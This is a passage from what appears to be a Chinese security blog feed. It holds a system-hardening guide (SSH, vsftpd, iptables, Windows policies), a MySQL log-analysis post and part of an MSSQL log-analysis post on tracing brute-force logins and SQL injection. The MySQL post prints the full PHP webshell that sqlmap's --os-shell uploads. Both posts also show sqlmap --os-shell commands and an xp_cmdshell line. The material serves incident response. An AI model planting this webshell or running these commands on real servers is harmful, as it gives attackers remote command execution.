src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820164103.png"></p></li><li><p>2.登录策略（Windows, Linux）</p></li><li><p>a.在用户登录系统时，应该有“For authorized users only”提示信息； </p></li><li><p>(1)打开管理工具,点击本地安全策略<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820155512.png"></p></li><li><p>(2)点击本地策略,找到安全选项<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820161220.png"></p></li><li><p>(3)选择试图登录的用户消息文本<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820161540.png"></p></li><li><p>(LINUX)</p></li><li><p>(1)使用vim 进入etc/isseue<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820164410.png"></p></li><li><p>(2)进入后在后面添加一条For authorized users only<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820164553.png"></p></li><li><p>b.远程用户非活动会话连接超时应小于等于5分钟。</p></li><li><p>(1)微软键+r 调用gpedit.msc<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820162202.png"></p></li><li><p>(2)点击管理模板,展开windows组件找到远程桌面服务<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820162714.png"></p></li><li><p>(3)点击远程桌面会话主机,然后点击会话时间限制<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820163054.png"></p></li><li><p>(4)启用空闲的远程桌面并设置5分钟<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820163455.png"></p></li></ul><p>(LINUX)</p><ul><li>(1)进入vim /etc/ssh/sshd_config </li><li><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820164957.png"></li><li>(2)找到</li><li><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820165301.png"></li><li>(3)更改成</li><li><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820165433.png"></li><li>3.用户安全管理(Windows)</li><li>a.设置user1用户只能在上班时间（周一至周五的9:00~18:00）可以登录，将user1的登录时间配置界面截图；</li></ul><ul><li>b.在组策略中只允许管理员账号从网络访问本机。</li><li>(1)打开本地策略,找到用户权限分配<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820191738.png"></li><li>(2)点击从网络访问此计算机<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820191934.png"></li><li>(3)将其他用户删除,保留管理员账号<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820192059.png"></li></ul><h2 id="A-2任务二-数据库加固（Linux）"><a href="#A-2任务二-数据库加固（Linux）" class="headerlink" title="A-2任务二 数据库加固（Linux）"></a>A-2任务二 数据库加固（Linux）</h2><ul><li><p>4.以普通帐户mysql安全运行mysql服务，禁止mysql以管理员帐号权限运行；</p></li><li><p>5.删除默认数据库(test)；</p></li><li><p>6.改变默认mysql管理员用户为:SuperRoot；</p></li><li><p>7.使用mysql内置MD5加密函数加密用户user1的密码为(P@ssw0rd1!)；</p></li><li><p>8.赋予user1用户对数据库所有表只有select,insert,delete,update权限。</p></li></ul><h1 id="A-3任务三-流量完整性保护（Windows）"><a href="#A-3任务三-流量完整性保护（Windows）" class="headerlink" title="A-3任务三 流量完整性保护（Windows）"></a>A-3任务三 流量完整性保护（Windows）</h1><ul><li>9.对Web网站进行HTTP重定向HTTPS设置，仅使用HTTPS协议访问网站（Windows）(注：证书颁发给test.com 并通过访问Web网站)。</li><li>(1)打开服务器管理,点击添加角色与功能向导<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210821154800.png"></li><li>然后下一步<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210821154935.png"></li><li>下一步</li><li>(2)这里我们选择证书服务和web服务器<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210821155219.png"></li><li>下一步<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210821155359.png"></li><li>下一步<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210821155415.png"></li><li>下一步<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210821155440.png"></li><li>(3)这里我们选择证书颁发机构和证书颁发机构web注册,然后下一步<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210821155459.png"></li><li>下一步<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210821155601.png"></li><li>下一步,然后点击安装<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210821155627.png"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210821160604.png"></li></ul><h1 id="A-4任务四-事件监控（Windows）"><a href="#A-4任务四-事件监控（Windows）" class="headerlink" title="A-4任务四 事件监控（Windows）"></a>A-4任务四 事件监控（Windows）</h1><ul><li><p>10.将Web服务器开启审核策略</p><pre class="line-numbers language-none"><code class="language-none">登录事件 成功/失败；特权使用 成功；策略更改 成功/失败；进程跟踪 成功/失败；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>(1)打开管理工具,点击本地安全策略,进入本地策略找到审核策略</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210821152904.png"></p></li><li><p>(2)点击审核登录事件,并打上√</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210821153114.png"></p></li><li><p>(3)点击审核特权使用</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210821153410.png"></p></li><li><p>(4)点击审核策略更改</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210821153235.png"></p></li><li><p>(5)点击审核进程跟踪</p></li><li><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210821153559.png"></p><h3 id="A-5任务五-服务加固SSH-VSFTPD-IIS（Windows-Linux）"><a href="#A-5任务五-服务加固SSH-VSFTPD-IIS（Windows-Linux）" class="headerlink" title="A-5任务五 服务加固SSH\VSFTPD\IIS（Windows, Linux）"></a>A-5任务五 服务加固SSH\VSFTPD\IIS（Windows, Linux）</h3></li><li><p>11.SSH服务加固（Linux）</p></li><li><p>a.修改ssh服务端口为2222；</p><pre class="line-numbers language-none"><code class="language-none">[root@linhuanxun ~]# vim /etc/ssh/sshd_configPort 2222<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>b.ssh禁止root用户远程登录。</p><pre class="line-numbers language-none"><code class="language-none">[root@linhuanxun ~]# vim /etc/ssh/sshd_configPermitRootLogin no<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li><p>12.VSFTPD服务加固（Linux）</p></li><li><p>a.vsftpd禁止匿名用户上传；</p><pre class="line-numbers language-none"><code class="language-none">[root@linhuanxun ~]# vim /etc/vsftpd/vsftpd.confanonymous_enable=NO<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>[root@linhuanxun ~]# vim /etc/vsftpd/vsftpd.conf</p></li><li><p>b.设置无任何操作的超时时间为5分钟。</p><pre class="line-numbers language-none"><code class="language-none">idle_session_timeout=300<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>13.IIS加固（Windows）</p></li><li><p>a.开启IIS的日志审计记录(日志文件保存格式为W3C,只记录日期、时间、客户端IP地址、用户名、方法)；</p></li><li><p>b.为了减轻网站负载，设置网站最大并发连接数为1000。</p></li></ul><h3 id="A-6任务六-防火墙策略（Windows-Linux）"><a href="#A-6任务六-防火墙策略（Windows-Linux）" class="headerlink" title="A-6任务六 防火墙策略（Windows, Linux）"></a>A-6任务六 防火墙策略（Windows, Linux）</h3><p>所有服务器开启防火墙,为防止勒索病毒攻击对防火墙进行加固策略：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820191125.png"></p><ul><li>14.Windows系统禁用445端口；</li><li>(1)打开管理工具,找到windows防火墙<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820185645.png"></li><li>(2)右击点击新建入站规则<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820185743.png"></li><li>(3)选择端口,然后下一步<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820190220.png"></li><li>(4)然后选择tpc协议指定445端口,然后下一步<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820190354.png"></li><li>(5)这里我们选择阻止连接<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820190539.png"></li><li>(6)这里随便输入<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820190640.png"><br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/20210820190746.png"></li><li>15.Windows系统禁用23端口；<pre class="line-numbers language-none"><code class="language-none">操作步骤和14小题一样<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>16.Linux系统禁用23端口；<pre class="line-numbers language-none"><code class="language-none">[root@linhuanxun ~]# iptables -A INPUT -p tcp -m tcp --dport 23  -j DROP[root@linhuanxun ~]# iptables -A INPUT -p udp -m udp --dport 23  -j DROP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li>17.Linux系统禁止别人ping通；<pre class="line-numbers language-none"><code class="language-none">[root@linhuanxun ~]# iptables -A INPUT -p ICMP -j DROP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li>18.为确保安全Linux系统禁止所有人通过ssh连接除了172.16.1.1这个ip。<pre class="line-numbers language-none"><code class="language-none">[root@linhuanxun ~]# iptables -I INPUT -s 172.16.1.1 -p tcp --dport 22 -j ACCEPT[root@linhuanxun ~]# iptables -A INPUT -p tcp --dport 22 -j DROP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="windows" scheme="http://www.xiaocaibi.top/tags/windows/"/>
    
  </entry>
  
  <entry>
    <title>第5篇：MySQL日志分析</title>
    <link href="http://www.xiaocaibi.top/posts/2985cf16.html"/>
    <id>http://www.xiaocaibi.top/posts/2985cf16.html</id>
    <published>2021-07-26T01:26:48.000Z</published>
    <updated>2021-09-20T08:47:43.869Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第5篇-MySQL日志分析"><a href="#第5篇-MySQL日志分析" class="headerlink" title="第5篇:MySQL日志分析"></a>第5篇:MySQL日志分析</h2><p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</p><h3 id="0x01-Mysql日志分析"><a href="#0x01-Mysql日志分析" class="headerlink" title="0x01 Mysql日志分析"></a>0x01 Mysql日志分析</h3><p>general query log能记录成功连接和每次执行的查询，我们可以将它用作安全布防的一部分，为故障分析或黑客事件后的调查提供依据。</p><pre class="line-numbers language-none"><code class="language-none">1、查看log配置信息show variables like '%general%';2、开启日志SET GLOBAL general_log = 'On';3、指定日志文件路径#SET GLOBAL general_log_file = '/var/lib/mysql/mysql.log';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>比如，当我访问 /test.php?id=1，此时我们得到这样的日志：</p><pre class="line-numbers language-none"><code class="language-none">190604 14:46:14       14 Connect    root@localhost on            14 Init DB    test           14 Query    SELECT * FROM admin WHERE id = 1           14 Quit  `<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们按列来解析一下：</p><pre class="line-numbers language-none"><code class="language-none">第一列:Time，时间列，前面一个是日期,后面一个是小时和分钟，有一些不显示的原因是因为这些sql语句几乎是同时执行的,所以就不另外记录时间了。第二列:Id，就是show processlist出来的第一列的线程ID,对于长连接和一些比较耗时的sql语句,你可以精确找出究竟是那一条那一个线程在运行。第三列:Command，操作类型，比如Connect就是连接数据库，Query就是查询数据库(增删查改都显示为查询)，可以特定过虑一些操作。第四列:Argument，详细信息，例如 Connect    root@localhost on 意思就是连接数据库，如此类推,接下面的连上数据库之后,做了什么查询的操作。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h3 id="0x02-登录成功-失败"><a href="#0x02-登录成功-失败" class="headerlink" title="0x02 登录成功/失败"></a>0x02 登录成功/失败</h3><p>我们来做个简单的测试吧，使用我以前自己开发的弱口令工具来扫一下，字典设置比较小，2个用户，4个密码，共8组。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-5-1.png"></p><p>MySQL中的log记录是这样子：</p><pre class="line-numbers language-none"><code class="language-none">Time                 Id        Command         Argument190601 22:03:20   98 Connectroot@192.168.204.1 on    98 ConnectAccess denied for user 'root'@'192.168.204.1' (using password: YES)  103 Connectmysql@192.168.204.1 on   103 ConnectAccess denied for user 'mysql'@'192.168.204.1' (using password: YES)  104 Connectmysql@192.168.204.1 on   104 ConnectAccess denied for user 'mysql'@'192.168.204.1' (using password: YES)  100 Connectroot@192.168.204.1 on   101 Connectroot@192.168.204.1 on   101 ConnectAccess denied for user 'root'@'192.168.204.1' (using password: YES)   99 Connectroot@192.168.204.1 on    99 ConnectAccess denied for user 'root'@'192.168.204.1' (using password: YES)  105 Connectmysql@192.168.204.1 on   105 ConnectAccess denied for user 'mysql'@'192.168.204.1' (using password: YES)  100 Queryset autocommit=0  102 Connectmysql@192.168.204.1 on   102 ConnectAccess denied for user 'mysql'@'192.168.204.1' (using password: YES)  100 Quit`<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>你知道在这个口令猜解过程中，哪个是成功的吗？</p><p>利用爆破工具，一个口令猜解成功的记录是这样子的：</p><pre class="line-numbers language-none"><code class="language-none">190601 22:03:20     100 Connectroot@192.168.204.1 on    100 Queryset autocommit=0   100 Quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>但是，如果你是用其他方式，可能会有一点点不一样的哦。</p><p>Navicat for MySQL登录：</p><pre class="line-numbers language-none"><code class="language-none">190601 22:14:07  106 Connectroot@192.168.204.1 on          106 QuerySET NAMES utf8         106 QuerySHOW VARIABLES LIKE 'lower_case_%'         106 QuerySHOW VARIABLES LIKE 'profiling'         106 QuerySHOW DATABASES<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>命令行登录：</p><pre class="line-numbers language-none"><code class="language-none">190601 22:17:25  111 Connectroot@localhost on          111 Queryselect @@version_comment limit 1190601 22:17:56  111 Quit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>这个差别在于，不同的数据库连接工具，它在连接数据库初始化的过程中是不同的。通过这样的差别，我们可以简单判断出用户是通过连接数据库的方式。</p><p>另外，不管你是爆破工具、Navicat for MySQL、还是命令行，登录失败都是一样的记录。</p><p>登录失败的记录：</p><pre class="line-numbers language-none"><code class="language-none">102 Connectmysql@192.168.204.1 on 102 ConnectAccess denied for user 'mysql'@'192.168.204.1' (using password: YES)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>利用shell命令进行简单的分析：</p><pre class="line-numbers language-none"><code class="language-none">#有哪些IP在爆破？grep  "Access denied" mysql.log |cut -d "'" -f4|uniq -c|sort -nr     27 192.168.204.1#爆破用户名字典都有哪些？grep  "Access denied" mysql.log |cut -d "'" -f2|uniq -c|sort -nr     13 mysql     12 root      1 root      1 mysql<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在日志分析中，特别需要注意一些敏感的操作行为，比如删表、备库，读写文件等。关键词：drop table、drop function、lock tables、unlock tables、load_file() 、into outfile、into dumpfile。</p><p>敏感数据库表：SELECT * from mysql.user、SELECT * from mysql.func</p><h3 id="0x03-SQL注入入侵痕迹"><a href="#0x03-SQL注入入侵痕迹" class="headerlink" title="0x03  SQL注入入侵痕迹"></a>0x03  SQL注入入侵痕迹</h3><p>在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的–os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：</p><p>1、构造一个SQL注入点，开启Burp监听8080端口</p><p><code>sqlmap.py  -u http://192.168.204.164/sql.php?id=1 --os-shell --proxy=http://127.0.0.1:8080</code></p><p>HTTP通讯过程如下：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-5-3.png"></p><p>创建了一个临时文件tmpbwyov.php，通过访问这个木马执行系统命令，并返回到页面展示。</p><p>tmpbwyov.php：</p><!--?php $c=$_REQUEST["cmd"];@set_time_limit(0);@ignore_user_abort(1);@ini_set('max_execution_time',0);$z=@ini_get('disable_functions');if(!empty($z)){$z=preg_replace('/[, ]+/',',',$z);$z=explode(',',$z);$z=array_map('trim',$z);}else{$z=array();}$c=$c." 2-->&amp;1\n";function f($n){global $z;return is_callable($n)and!in_array($n,$z);}if(f('system')){ob_start();system($c);$w=ob_get_contents();ob_end_clean();}elseif(f('proc_open')){$y=proc_open($c,array(array(pipe,r),array(pipe,w),array(pipe,w)),$t);$w=NULL;while(!feof($t[1])){$w.=fread($t[1],512);}@proc_close($y);}elseif(f('shell_exec')){$w=shell_exec($c);}elseif(f('passthru')){ob_start();passthru($c);$w=ob_get_contents();ob_end_clean();}elseif(f('popen')){$x=popen($c,r);$w=NULL;if(is_resource($x)){while(!feof($x)){$w.=fread($x,512);}}@pclose($x);}elseif(f('exec')){$w=array();exec($c,$w);$w=join(chr(10),$w).chr(10);}else{$w=0;}print "<pre>".$w."</pre>";?&gt;<p>`</p><p>创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。</p><p>通过查看网站目录中最近新建的可疑文件，可以判断是否发生过sql注入漏洞攻击事件。</p><p>检查方法：</p><p>1、检查网站目录下，是否存在一些木马文件：<br><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-5-4.png"></p><p>2、检查是否有UDF提权、MOF提权痕迹</p><p>检查目录是否有异常文件</p><p>mysql\lib\plugin </p><p>c:/windows/system32/wbem/mof/</p><p>检查函数是否删除</p><p><code>select * from mysql.func</code></p><p>3、结合web日志分析。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="日志分析" scheme="http://www.xiaocaibi.top/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第4篇：MSSQL日志分析</title>
    <link href="http://www.xiaocaibi.top/posts/4b2c6b60.html"/>
    <id>http://www.xiaocaibi.top/posts/4b2c6b60.html</id>
    <published>2021-07-25T01:26:28.000Z</published>
    <updated>2021-09-20T08:47:43.869Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="第4篇-MSSQL日志分析"><a href="#第4篇-MSSQL日志分析" class="headerlink" title="第4篇:MSSQL日志分析"></a>第4篇:MSSQL日志分析</h2><p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</p><h3 id="0x01-MSSQL日志分析"><a href="#0x01-MSSQL日志分析" class="headerlink" title="0x01 MSSQL日志分析"></a>0x01 MSSQL日志分析</h3><p>首先，MSSQL数据库应启用日志记录功能，默认配置仅限失败的登录，需修改为失败和成功的登录，这样就可以对用户登录进行审核。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-4-3.png"></p><p>登录到SQL Server Management Studio，依次点击 管理–SQL Server 日志</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-4-4.png"></p><p>双击日志存档文件即可打开日志文件查看器，并可以对日志进行筛选或者导出等操作。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-4-5.png"></p><p>另外，MSSQ提供了一个工具SQL Server Profiler ，方便查找和发现SQL执行的效率和语句问题。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-4-6.png"></p><p>日志分析案例：</p><p>在日志文件查看器中，选择筛选，在筛选设置中源设置为“登录”，应用筛选器，确定。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-4-7.png"></p><p>筛选后的结果，可以很清晰的识别用户登录信息，记录内容包括用户登录时间、登录是否成功、登录使用的账号以及远程登录时用户使用的IP地址。</p><p>如下图：客户端：192.168.204.1进行尝试弱口令登录，并发现其中有一条登录成功的记录。</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-4-8.png"></p><h3 id="0x02-SQL注入入侵痕迹"><a href="#0x02-SQL注入入侵痕迹" class="headerlink" title="0x02  SQL注入入侵痕迹"></a>0x02  SQL注入入侵痕迹</h3><p>在利用SQL注入漏洞的过程中，我们会尝试利用sqlmap的–os-shell参数取得shell，如操作不慎，可能留下一些sqlmap创建的临时表和自定义函数。我们先来看一下sqlmap os-shell参数的用法以及原理：</p><p>1、构造一个SQL注入点，开启Burp监听8080端口</p><p><code>sqlmap.py  -u http://192.168.204.164/sql.asp?id=1 --os-shell --proxy=http://127.0.0.1:8080</code></p><p>HTTP通讯过程如下：</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-4-1.png"></p><p>创建了一个临时表sqlmapoutput，调用存储过程执行系统命令将数据写入临时表，然后取临时表中的数据展示到前端。</p><p>通过查看数据库中最近新建的表的结构和内容，可以判断是否发生过sql注入漏洞攻击事件。</p><p>检查方法：</p><p>1、数据库表检查</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://cdn.jsdelivr.net/gh/linbolg/web/log-4-2.png"><br>2、检查xp_cmdshell等存储过程</p><p>xp_cmdshell在mssql2005之后的版本中是默认禁止的，查看xp_cmdshell是否被启用。</p><p>`Exec master.dbo.xp_cmdshell ‘whoami’</p><p>3、需要结合web日志，通过查看日志文件的大小以及审计日志文件中的内容，可以判断是否发生过sql注入漏洞攻击事件。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="日志分析" scheme="http://www.xiaocaibi.top/tags/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
  <entry>
    <title>第3篇：Web日志分析</title>
    <link href="http://www.xiaocaibi.top/posts/196d13a8.html"/>
    <id>http://www.xiaocaibi.top/posts/196d13a8.html</id>
    <published>2021-07-24T02:26:01.000Z</published>
    <updated>2021-09-20T08:47:43.838Z</updated>
    
